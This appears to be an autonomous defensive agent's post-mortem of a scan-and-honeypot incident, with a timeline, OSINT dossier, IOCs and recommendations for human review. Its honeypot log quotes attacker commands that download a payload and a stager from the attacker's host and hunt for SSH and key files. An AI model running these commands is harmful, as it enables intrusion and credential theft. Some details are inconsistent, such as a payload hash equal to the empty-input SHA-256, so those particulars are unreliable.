# Post-Mortem Report: Incident INC-2024-0615-0314

**Generated:** 2024-06-15T08:00:00Z
**Agent:** The Mirror (cyber-riposte)
**Status:** Autonomous response completed — awaiting human review

---

## Executive Summary

At 03:14 UTC, the agent detected an Nmap service scan from `198.51.100.23` targeting production perimeter hosts. The agent autonomously redirected the attacker to a honeypot, ran passive OSINT, collected 23 minutes of attacker interaction data, and applied a temporary block. All actions were from the pre-approved action pool (Tier 1). No human intervention was required. The attacker's infrastructure appears to be a dedicated attack VPS running Metasploit, Cobalt Strike, and Covenant.

## Timeline

| Time (UTC) | Action | Tier | Result |
|------------|--------|------|--------|
| 03:14:07 | Recon detected (Nmap scan, 847 ports in 12s) | — | Detection |
| 03:14:08 | `redirect-to-honeypot` — DNAT to 10.0.0.99 | T1 | Success |
| 03:14:09 | `run-osint` — WHOIS lookup | T1 | Success |
| 03:14:10 | `run-osint` — Reverse DNS lookup | T1 | Success |
| 03:14:12 | `run-osint` — Shodan lookup | T1 | Success |
| 03:14:15 | `run-osint` — Certificate Transparency search | T1 | Success |
| 03:14:22 | `collect-honeypot-evidence` — session logging started | T1 | Success |
| 03:37:41 | Attacker disconnected from honeypot | — | Observation |
| 03:37:42 | `temp-block-ip` — drop rule for 198.51.100.23 (1h expiry) | T1 | Success |
| 03:37:45 | Post-mortem report generated | — | This report |

## What Triggered This

- **Signal:** Suricata alert `ET SCAN Nmap Scripting Engine User-Agent Detected` + suspicious user-agent match
- **Source IP:** 198.51.100.23
- **Detection confidence:** 0.97 (IDS alert: 0.90 + UA match: 0.95 → combined 0.97)
- **First seen:** 03:14:07 UTC

### User-Agent Analysis

The attacker's tools identified themselves via default user-agent strings:

| Time | User-Agent | Tool Identified | Threat Level |
|------|-----------|----------------|--------------|
| 03:14:07 | `Nmap Scripting Engine; https://nmap.org/book/nse.html` | Nmap NSE | High |
| 03:18:33 | `Nuclei - Open-source project (github.com/projectdiscovery/nuclei)` | Nuclei | High |
| 03:22:15 | `sqlmap/1.8#stable` | sqlmap | High |
| 03:29:41 | `gobuster/3.6` | Gobuster | High |
| 03:33:08 | `python-requests/2.31.0` | Python requests (custom script) | Low |

The attacker used at least 4 distinct offensive tools with default user-agents. This indicates either low operational security or a lack of concern about detection — consistent with automated/commodity attacks rather than APT tradecraft.

## What the Agent Did

### Actions Taken (from pre-approved pool)

1. **`redirect-to-honeypot`** (Tier 1)
   - Applied nftables DNAT rule: `198.51.100.23 → 10.0.0.99`
   - nftables handle: `0x3a7f` (for rollback)
   - Expires: 2024-06-16T03:14:08Z (24h)
   - *Justification:* Recon pattern matched, attacker not allowlisted, honeypot healthy

2. **`run-osint`** (Tier 1, 4 modules)
   - WHOIS: Resolved to Example Hosting LLC, AS64496, Netherlands
   - rDNS: `vps-7429.example-hosting.nl`
   - Shodan: Ports 22, 80, 443, 4444 (Metasploit), 8080 (Cobalt Strike), 8443 (Covenant)
   - CT: 3 domains with certs issued in the last 5 days (phishing infrastructure)
   - *Justification:* Standard OSINT collection, passive only, within rate limits

3. **`collect-honeypot-evidence`** (Tier 1)
   - Cowrie SSH log: 47 commands, 12 credential attempts
   - HTTP honeypot log: 23 requests including SQLi and path traversal
   - PCAP: 14.2 MB captured
   - *Justification:* Attacker actively interacting with honeypot

4. **`temp-block-ip`** (Tier 1)
   - Applied after attacker disconnected
   - nftables handle: `0x3a81` (for rollback)
   - Expires: 2024-06-15T04:37:42Z (1h)
   - *Justification:* Recon + exploitation attempts complete, prevent re-engagement

### Actions NOT Taken (and why)

- **`block-ip-range`** (Tier 2) — Not triggered. Only a single source IP was involved. Agent does not escalate to range blocks for single-actor incidents without coordinated activity evidence.
- **`sinkhole-domain`** (Tier 2) — Not triggered. Phishing domains found in CT logs were not observed in our DNS query logs. No evidence they targeted our users. Recommend manual review.
- **`permanent-block-rule`** (Tier 3) — Requires human approval. Agent recommends this in the review section below.

## Attacker Dossier

| | |
|---|---|
| **IP** | 198.51.100.23 |
| **Owner** | Example Hosting LLC (AS64496, NL) |
| **Hosting** | Budget VPS provider, Netherlands |
| **Open ports** | 22, 80, 443, 4444, 8080, 8443 |
| **Offensive tools** | Metasploit RPC (4444), Cobalt Strike (8080), Covenant C2 (8443) |
| **Associated domains** | `phishing-login.example.com`, `update-service.example.net`, `vpn-portal.example.org` |
| **Domain registration** | All within last 5 days |
| **Assessment** | Dedicated attack infrastructure — not a compromised legitimate host |

*Full dossier: [example-dossier.md](example-dossier.md)*

## Honeypot Interaction Summary

- **Session duration:** 23 minutes (03:14:22 — 03:37:41)
- **Commands entered:** 47
- **Credentials attempted:** 12 username/password combinations
- **Files downloaded:** 1 (`payload.elf` from attacker's own server)
- **Tools identified:** Nmap 7.94, Hydra 9.5, custom Python script

Notable commands:
```
wget http://198.51.100.23:8080/payload.elf
find / -name "*.pem" 2>/dev/null
cat /root/.ssh/authorized_keys
curl http://198.51.100.23:4444/stager
```

## Evidence Chain

| Action | Evidence |
|--------|----------|
| Detection | Suricata alert ID `EVE-20240615-031407-001`, signature `ET SCAN Nmap Scripting Engine` |
| Redirect | nftables handle `0x3a7f`, applied at 03:14:08Z |
| OSINT | WHOIS response cached at `/evidence/whois-198-51-100-23.txt` |
| OSINT | Shodan response cached at `/evidence/shodan-198-51-100-23.json` |
| OSINT | CT log results at `/evidence/ct-198-51-100-23.json` |
| Honeypot | Cowrie session log at `/evidence/cowrie-session-abc123.json` |
| Honeypot | PCAP at `/evidence/mirror-capture-198-51-100-23.pcap` (14.2 MB) |
| Block | nftables handle `0x3a81`, applied at 03:37:42Z, expires 04:37:42Z |

## IOCs Extracted

```json
{
  "ip": "198.51.100.23",
  "asn": "AS64496",
  "domains": [
    "phishing-login.example.com",
    "update-service.example.net",
    "vpn-portal.example.org"
  ],
  "open_ports": [22, 80, 443, 4444, 8080, 8443],
  "tools_detected": ["metasploit", "cobalt-strike", "covenant"],
  "user_agents_observed": ["Nmap Scripting Engine", "Nuclei", "sqlmap/1.8", "gobuster/3.6", "python-requests/2.31.0"],
  "payload_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "payload_url": "http://198.51.100.23:8080/payload.elf"
}
```

## Recommendations for Human Review

1. **Upgrade to permanent block** — The temp block expires in 1h. Recommend converting to a permanent rule (Tier 3, PR required).
2. **Sinkhole phishing domains** — CT logs reveal 3 freshly registered phishing domains. Check if they targeted our employees. If so, sinkhole them.
3. **Report to abuse contact** — `abuse@example-hosting.nl`. Include IOCs.
4. **Sandbox `payload.elf`** — The attacker downloaded a payload from their own server to the honeypot. Analyze in sandbox.
5. **Check employee email** — The phishing domains follow our company naming pattern. Verify no phishing emails were sent.

## Action Pool Feedback

Based on this incident, the agent suggests the following changes to the action pool:

1. **Consider promoting `sinkhole-domain` to Tier 1** for domains found via CT that match a naming pattern similar to our company's domains. This incident had a 3-day head start on phishing infrastructure we could have sinkholed immediately.
2. **Add Tier 1 action: `submit-payload-to-sandbox`** — attacker payloads downloaded to the honeypot should be automatically submitted for analysis. Currently requires manual action.
3. **Current pool performed well** — all Tier 1 actions executed correctly, no false positives, evidence chain is complete.

---

*This report was generated autonomously. All actions were executed from the pre-approved action pool. No actions outside the pool were taken. Review the audit log for the complete trail: `/var/log/cyber-riposte/audit.jsonl`*
